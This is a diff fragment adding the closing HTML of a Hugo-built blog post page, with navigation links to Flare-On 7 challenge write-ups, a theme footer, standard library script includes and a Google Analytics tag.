+    <div class="post-nav"><a href="/posts/flare-on-7-break/" class="prev" rel="prev" title="Flare-On 7 — 10 Break"><i class="fas fa-angle-left fa-fw"></i>Flare-On 7 — 10 Break</a>
+            <a href="/posts/flare-on-7-opening-notes/" class="next" rel="next" title="Flare-On 7 — Welcome ♥">Flare-On 7 — Welcome ♥<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.76.5">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-Z0NYXY577C');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-Z0NYXY577C" async></script></body>
+</html>
